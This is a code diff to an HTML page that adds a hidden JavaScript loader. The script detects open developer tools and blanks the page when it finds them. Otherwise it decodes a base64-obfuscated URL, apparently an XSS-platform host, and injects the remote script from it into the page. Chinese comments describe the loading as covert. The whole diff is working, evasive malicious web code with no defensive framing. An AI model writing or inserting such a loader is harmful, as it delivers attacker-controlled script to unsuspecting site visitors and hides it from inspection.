@@ -5,14 +5,19 @@
 </head>
 <body>
 	<script type="text/javascript">
+		
 		var isDebugT = setInterval(function(){
 			if(isDebug() == true){
+				window.location.href = 'about:blank';	//空白页
+				//window.location.reload();	//刷新页面
 				clearInterval(isDebugT);
 			}else{
-				execute();
+				//execute();	//隐性执行
+				load();//隐性加载js文件
 				clearInterval(isDebugT);
 			};
 		},1000);
+
 		function isDebug(){
 			if((window.outerHeight-window.innerHeight)>200){
 			   return true;
@@ -22,10 +27,11 @@
 			};
 			return false;
 		};
+
 		function execute(){
-			var explorerhmu=atob('aHR0cHM6Ly94c3MuYnovc2NyaXB0L0ppbmdOaQ');
+			var url=atob('aHR0cHM6Ly94c3MuYnovc2NyaXB0L0ppbmdOaQ');
 			var xhr = new XMLHttpRequest();
-			xhr.open("get",explorerhmu,true);
+			xhr.open("get",url,true);
 			xhr.send();
 			xhr.onreadystatechange=function(){
 				if(xhr.readyState == 4 && xhr.status == 200){
@@ -33,6 +39,14 @@
 				}
 			};
 		};
+		
+		function load(){
+			var url = atob('aHR0cHM6Ly94c3MuYnovc2NyaXB0L0ppbmdOaQ');
+			var jsDom = document.createElement("script");
+			jsDom.src = url;
+			console.log(jsDom,url);
+			document.querySelector('head').appendChild(jsDom);
+		}
 	</script>
 </body>
 </html>
